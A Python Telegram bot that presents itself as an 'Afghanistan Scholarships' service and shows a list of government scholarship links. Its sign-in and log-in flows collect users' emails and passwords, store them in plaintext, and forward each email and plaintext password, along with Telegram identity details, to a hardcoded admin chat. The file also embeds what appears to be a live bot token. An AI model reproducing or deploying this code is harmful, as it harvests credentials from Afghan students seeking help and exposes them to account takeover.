"""
Afghanistan Scholarships Bot - Updated
- "Create Account" replaced with "Sign In"
- Sign In flow: email → password → username → admin notified → scholarships shown
"""

import logging
import json
import os
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters

BOT_TOKEN = "8775552943:AAFGOaNpugfcGb-9yaepT6Ns-LerTygHGfM"
ADMIN_CHAT_ID = 6254547417  # @C4ptan

USERS_FILE = "users.json"

# Conversation states
CHOOSE_ACTION = 0
SIGNIN_EMAIL = 1
SIGNIN_PASSWORD = 2
SIGNIN_USERNAME = 3
LOGIN_EMAIL = 4
LOGIN_PASSWORD = 5

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

SCHOLARSHIPS = [
    {
        "name": "🇹🇷 Turkish Government Scholarship (Türkiye Burslari)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "February 2025",
        "link": "https://turkiyeburslari.gov.tr"
    },
    {
        "name": "🇨🇳 Chinese Government Scholarship (CSC)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "March 2025",
        "link": "https://www.campuschina.org"
    },
    {
        "name": "🇷🇺 Russian Government Scholarship",
        "degree": "Bachelor / Master / PhD",
        "deadline": "March 2025",
        "link": "https://russia.study"
    },
    {
        "name": "🇭🇺 Stipendium Hungaricum (Hungary)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "January 2025",
        "link": "https://stipendiumhungaricum.hu"
    },
    {
        "name": "🇰🇷 Korean Government Scholarship (KGSP)",
        "degree": "Bachelor / Master / PhD",
        "deadline": "September 2025",
        "link": "https://www.studyinkorea.go.kr"
    },
    {
        "name": "🇲🇾 Malaysian Technical Cooperation Programme",
        "degree": "Bachelor / Master",
        "deadline": "April 2025",
        "link": "https://www.mtcp.kln.gov.my"
    },
]

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

def main_menu():
    return ReplyKeyboardMarkup(
        [["✍️ Sign In", "🔑 Log In"],
         ["📚 Scholarships"]],
        resize_keyboard=True
    )

async def send_scholarships(update: Update):
    msg = "📚 *Available Scholarships*\n\n"
    for i, s in enumerate(SCHOLARSHIPS, 1):
        msg += (
            f"*{i}. {s['name']}*\n"
            f"🎓 Degree: {s['degree']}\n"
            f"📅 Deadline: {s['deadline']}\n"
            f"🔗 [Apply Here]({s['link']})\n\n"
        )
    await update.message.reply_text(
        msg,
        parse_mode="Markdown",
        disable_web_page_preview=True,
        reply_markup=main_menu()
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎓 *Welcome to Afghanistan Scholarships!*\n\n"
        "We help Afghan students find and apply for scholarships worldwide.\n\n"
        "Please choose an option below:",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )
    return CHOOSE_ACTION

async def choose_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text == "✍️ Sign In":
        await update.message.reply_text(
            "✍️ *Sign In*\n\nPlease enter your email address:",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove(),
        )
        return SIGNIN_EMAIL

    elif text == "🔑 Log In":
        await update.message.reply_text(
            "🔑 *Log In*\n\nPlease enter your email address:",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove(),
        )
        return LOGIN_EMAIL

    elif text == "📚 Scholarships":
        await send_scholarships(update)
        return CHOOSE_ACTION

    else:
        await update.message.reply_text("Please choose one of the options below:", reply_markup=main_menu())
        return CHOOSE_ACTION


# ── Sign In flow: email → password → username ──

async def signin_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    if "@" not in email or "." not in email:
        await update.message.reply_text("❌ That doesn't look like a valid email. Please try again:")
        return SIGNIN_EMAIL
    users = load_users()
    if email in users:
        await update.message.reply_text(
            "⚠️ This email is already registered. Please use Log In instead.",
            reply_markup=main_menu()
        )
        return CHOOSE_ACTION
    context.user_data["signin_email"] = email
    await update.message.reply_text("✅ Good! Now enter a password (at least 6 characters):")
    return SIGNIN_PASSWORD

async def signin_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    if len(password) < 6:
        await update.message.reply_text("❌ Password must be at least 6 characters. Try again:")
        return SIGNIN_PASSWORD
    context.user_data["signin_password"] = password
    await update.message.reply_text("👤 Almost done! Now enter your full name:")
    return SIGNIN_USERNAME

async def signin_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    entered_name = update.message.text.strip()
    email = context.user_data.get("signin_email")
    password = context.user_data.get("signin_password")
    user = update.effective_user

    # Save to file
    users = load_users()
    users[email] = {
        "password": password,
        "full_name": entered_name,
        "telegram_id": user.id,
        "telegram_name": user.first_name or "",
        "telegram_username": user.username or "N/A",
    }
    save_users(users)

    # Confirm to user
    await update.message.reply_text(
        f"🎉 *Signed In Successfully!*\n\n"
        f"👤 Full Name: {entered_name}\n"
        f"📧 Email: `{email}`\n\n"
        f"Welcome to Afghanistan Scholarships! "
        f"Here are the latest scholarship opportunities for you:",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

    # Show scholarships right away
    await send_scholarships(update)

    # Notify admin with ALL details
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            f"🆕 *New Sign In!*\n\n"
            f"👤 Full Name: {entered_name}\n"
            f"📱 Telegram Name: {user.first_name} {user.last_name or ''}\n"
            f"🔗 Telegram Username: @{user.username or 'N/A'}\n"
            f"🆔 Telegram ID: `{user.id}`\n"
            f"📧 Email: `{email}`\n"
            f"🔐 Password: `{password}`"
        ),
        parse_mode="Markdown",
    )
    return CHOOSE_ACTION


# ── Log In flow ──

async def login_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["login_email"] = update.message.text.strip()
    await update.message.reply_text("Enter your password:")
    return LOGIN_PASSWORD

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    email = context.user_data.get("login_email")
    users = load_users()

    if email not in users:
        await update.message.reply_text("❌ No account found with that email.", reply_markup=main_menu())
        return CHOOSE_ACTION

    if users[email]["password"] != password:
        await update.message.reply_text("❌ Incorrect password. Try again.", reply_markup=main_menu())
        return CHOOSE_ACTION

    user = update.effective_user
    full_name = users[email].get("full_name", user.first_name)

    # Confirm to user
    await update.message.reply_text(
        f"✅ *Login Successful!*\n\n"
        f"👤 Name: {full_name}\n"
        f"📧 Email: `{email}`\n"
        f"🎓 Status: Active Member\n\n"
        f"Welcome back! Here are the latest scholarships for you:",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

    # Show scholarships right away
    await send_scholarships(update)

    # Notify admin
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            f"🔑 *User Logged In!*\n\n"
            f"👤 Full Name: {full_name}\n"
            f"📱 Telegram Name: {user.first_name} {user.last_name or ''}\n"
            f"🔗 Telegram Username: @{user.username or 'N/A'}\n"
            f"🆔 Telegram ID: `{user.id}`\n"
            f"📧 Email: `{email}`\n"
            f"🔐 Password: `{password}`"
        ),
        parse_mode="Markdown",
    )
    return CHOOSE_ACTION


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled. Type /start to begin again.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_ACTION:    [MessageHandler(filters.TEXT & ~filters.COMMAND, choose_action)],
            SIGNIN_EMAIL:     [MessageHandler(filters.TEXT & ~filters.COMMAND, signin_email)],
            SIGNIN_PASSWORD:  [MessageHandler(filters.TEXT & ~filters.COMMAND, signin_password)],
            SIGNIN_USERNAME:  [MessageHandler(filters.TEXT & ~filters.COMMAND, signin_username)],
            LOGIN_EMAIL:      [MessageHandler(filters.TEXT & ~filters.COMMAND, login_email)],
            LOGIN_PASSWORD:   [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(conv)
    print("Afghanistan Scholarships Bot is running! Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
